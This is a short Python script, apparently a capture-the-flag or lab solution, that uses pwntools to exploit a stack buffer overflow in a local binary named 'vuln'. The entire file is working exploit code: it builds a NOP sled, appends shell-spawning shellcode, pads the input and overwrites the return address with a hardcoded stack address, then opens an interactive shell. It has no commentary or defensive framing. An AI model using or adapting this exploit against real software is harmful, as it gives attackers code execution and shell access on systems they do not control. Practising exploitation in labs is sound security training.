#!/usr/bin/python3
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = b'\x90' * 240
payload += asm(shellcraft.sh())
payload = payload.ljust(312, b'A')
payload += p32(0xffffd284)

log.info(p.clean())

p.sendline(payload)

p.interactive()
